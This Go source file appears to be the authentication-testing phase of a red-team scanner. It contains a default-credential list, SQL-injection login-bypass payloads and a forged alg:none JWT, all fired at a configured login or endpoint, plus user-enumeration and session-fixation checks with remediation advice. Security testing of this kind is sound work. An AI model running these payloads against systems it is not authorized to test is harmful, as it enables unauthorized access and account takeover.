package scanner

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log"
	"strings"
	"time"

	"red-team-agent/internal/config"
	"red-team-agent/internal/knowledge"
)

// RunAuth - Phase 3: Authentication Testing
func (s *Scanner) RunAuth(ctx context.Context, target config.Target) *PhaseResult {
	start := time.Now()
	result := &PhaseResult{Phase: "Authentication"}

	log.Printf("[Auth] Starting authentication testing for %s", target.URL)

	if target.Auth.Method == "none" {
		log.Printf("[Auth] No authentication configured, skipping auth tests")
		result.Duration = time.Since(start)
		return result
	}

	// Default credential testing
	s.testDefaultCredentials(ctx, target, result)

	// Login bypass techniques
	s.testLoginBypass(ctx, target, result)

	// JWT/Token analysis
	s.testJWTManipulation(ctx, target, result)

	// Password reset flow testing
	s.testPasswordReset(ctx, target, result)

	// Session fixation
	s.testSessionFixation(ctx, target, result)

	result.Duration = time.Since(start)
	log.Printf("[Auth] Completed: %d findings", len(result.Findings))
	return result
}

var defaultCredentials = []struct {
	username string
	password string
}{
	{"admin", "admin"},
	{"admin", "password"},
	{"admin", "admin123"},
	{"admin", "root"},
	{"root", "root"},
	{"root", "toor"},
	{"test", "test"},
	{"user", "user"},
	{"guest", "guest"},
	{"administrator", "administrator"},
	{"admin", "123456"},
	{"admin", "admin@123"},
	{"admin", "Password1"},
	{"demo", "demo"},
}

func (s *Scanner) testDefaultCredentials(ctx context.Context, target config.Target, result *PhaseResult) {
	if target.Auth.Method != "form" || target.Auth.LoginURL == "" {
		return
	}

	log.Printf("[Auth] Testing default credentials")
	for _, cred := range defaultCredentials {
		select {
		case <-ctx.Done():
			return
		default:
		}

		username := cred.username
		password := cred.password
		if target.Auth.Username != "" {
			username = target.Auth.Username
		}

		resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
			Method: "POST",
			URL:    target.Auth.LoginURL,
			Headers: map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			},
			Body: fmt.Sprintf("username=%s&password=%s", username, password),
		})
		if err != nil {
			continue
		}

		// If we get a redirect or 200 with a session token, credentials worked
		if resp.StatusCode == 200 || resp.StatusCode == 302 {
			// Check if login actually succeeded (not just returned to login page)
			if !strings.Contains(resp.Body, "invalid") && !strings.Contains(resp.Body, "incorrect") && !strings.Contains(resp.Body, "error") {
				result.Findings = append(result.Findings, Finding{
					Type:        "default-credentials",
					Severity:    "critical",
					Title:       "Default Credentials Work",
					Description: fmt.Sprintf("Default credentials %s/%s are accepted", cred.username, cred.password),
					URL:         target.Auth.LoginURL,
					Payload:     fmt.Sprintf("%s:%s", cred.username, cred.password),
					Evidence:    fmt.Sprintf("HTTP %d - login successful with default credentials", resp.StatusCode),
					Remediation: "Change all default passwords and enforce strong password policies",
				})
				s.KB.RecordTechnique("default-credentials", "auth", true)
				return
			}
		}
		s.KB.RecordTechnique("default-credentials", "auth", false)
	}
}

var loginBypassPayloads = []struct {
	name     string
	username string
	password string
}{
	{"SQLi comment", "admin'--", "anything"},
	{"SQLi OR", "admin' OR '1'='1", "anything"},
	{"SQLi OR 2", "' OR 1=1--", "anything"},
	{"SQLi admin hash", "admin' OR 1=1#", "anything"},
	{"Empty password", "admin", ""},
	{"Null byte", "admin%00", "password"},
	{"Backslash", "admin\\", "password"},
}

func (s *Scanner) testLoginBypass(ctx context.Context, target config.Target, result *PhaseResult) {
	if target.Auth.LoginURL == "" {
		return
	}

	log.Printf("[Auth] Testing login bypass techniques")
	for _, payload := range loginBypassPayloads {
		select {
		case <-ctx.Done():
			return
		default:
		}

		resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
			Method: "POST",
			URL:    target.Auth.LoginURL,
			Headers: map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			},
			Body: fmt.Sprintf("username=%s&password=%s", payload.username, payload.password),
		})
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 || resp.StatusCode == 302 {
			if !strings.Contains(resp.Body, "invalid") && !strings.Contains(resp.Body, "incorrect") && !strings.Contains(resp.Body, "error") {
				result.Findings = append(result.Findings, Finding{
					Type:        "auth-bypass",
					Severity:    "critical",
					Title:       fmt.Sprintf("Login Bypass via %s", payload.name),
					Description: fmt.Sprintf("Authentication bypassed using %s technique", payload.name),
					URL:         target.Auth.LoginURL,
					Parameter:   "username",
					Payload:     fmt.Sprintf("%s:%s", payload.username, payload.password),
					Evidence:    fmt.Sprintf("HTTP %d - bypass successful", resp.StatusCode),
					Remediation: "Use parameterized queries and proper input validation",
				})
				s.KB.RecordTechnique("login-bypass-"+payload.name, "auth", true)
			}
		}
		s.KB.RecordTechnique("login-bypass-"+payload.name, "auth", false)
	}
}

func (s *Scanner) testJWTManipulation(ctx context.Context, target config.Target, result *PhaseResult) {
	log.Printf("[Auth] Testing JWT manipulation")

	// alg:none attack
	jwtNonePayload := "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
	
	if s.KB.HasTech("jwt") || target.Auth.Method == "token" {
		endpoints := s.KB.Endpoints
		for _, ep := range endpoints {
			if !ep.Auth {
				continue
			}
			resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
				Method: "GET",
				URL:    ep.URL,
				Headers: map[string]string{
					"Authorization": "Bearer " + jwtNonePayload,
				},
			})
			if err != nil {
				continue
			}
			if resp.StatusCode == 200 {
				result.Findings = append(result.Findings, Finding{
					Type:        "jwt-alg-none",
					Severity:    "critical",
					Title:       "JWT alg:none Bypass",
					Description: "The server accepts JWT tokens with 'none' algorithm, allowing complete auth bypass",
					URL:         ep.URL,
					Payload:     jwtNonePayload,
					Evidence:    fmt.Sprintf("HTTP %d with alg:none token", resp.StatusCode),
					Remediation: "Reject JWT tokens with 'none' algorithm on the server side",
				})
				s.KB.RecordTechnique("jwt-alg-none", "auth", true)
			} else {
				s.KB.RecordTechnique("jwt-alg-none", "auth", false)
			}
		}
	}
}

func (s *Scanner) testPasswordReset(ctx context.Context, target config.Target, result *PhaseResult) {
	log.Printf("[Auth] Testing password reset flow")

	resetURLs := []string{
		"/forgot-password", "/reset-password", "/api/auth/forgot",
		"/api/auth/reset", "/api/v1/forgot-password",
	}

	for _, path := range resetURLs {
		url := strings.TrimRight(target.URL, "/") + path
		resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
			Method: "GET",
			URL:    url,
		})
		if err == nil && resp.StatusCode == 200 {
			ep := knowledge.Endpoint{
				URL:           url,
				Method:        "GET",
				DiscoveredAt:  time.Now(),
				DiscoveredBy:  "auth-testing",
			}
			result.Endpoints = append(result.Endpoints, ep)

			// Test user enumeration
			resp2, err := s.HTTPClient.MakeRequest(HTTPRequest{
				Method:  "POST",
				URL:     url,
				Headers: map[string]string{"Content-Type": "application/json"},
				Body:    `{"email":"admin@example.com"}`,
			})
			if err == nil {
				body := strings.ToLower(resp2.Body)
				if strings.Contains(body, "sent") || strings.Contains(body, "email") {
					if strings.Contains(body, "not found") || strings.Contains(body, "no account") {
						// No enumeration
					} else {
						result.Findings = append(result.Findings, Finding{
							Type:        "user-enumeration",
							Severity:    "medium",
							Title:       "User Enumeration via Password Reset",
							Description: "Password reset reveals whether an email/account exists",
							URL:         url,
							Evidence:    resp2.Body,
							Remediation: "Use generic success messages regardless of email existence",
						})
					}
				}
			}
		}
	}
}

func (s *Scanner) testSessionFixation(ctx context.Context, target config.Target, result *PhaseResult) {
	log.Printf("[Auth] Testing session fixation")

	// Generate a fixed session ID
	fixedSID := hex.EncodeToString(sha256.New().Sum([]byte("test-session-fixation")))

	if target.Auth.LoginURL != "" {
		// Try setting a session cookie before login
		resp, err := s.HTTPClient.MakeRequest(HTTPRequest{
			Method: "POST",
			URL:    target.Auth.LoginURL,
			Headers: map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
				"Cookie":       "session=" + fixedSID,
			},
			Body: fmt.Sprintf("username=%s&password=%s", target.Auth.Username, target.Auth.Password),
		})
		if err == nil {
			// Check if session ID changed after login
			if getHeader(resp.Headers, "Set-Cookie") == "" {
				// Session cookie was not renewed - potential fixation
				result.Findings = append(result.Findings, Finding{
					Type:        "session-fixation",
					Severity:    "high",
					Title:       "Session Fixation",
					Description: "Session ID is not renewed after authentication",
					URL:         target.Auth.LoginURL,
					Evidence:    "Session cookie not renewed post-login",
					Remediation: "Always generate a new session ID after successful authentication",
				})
			}
		}
	}
}
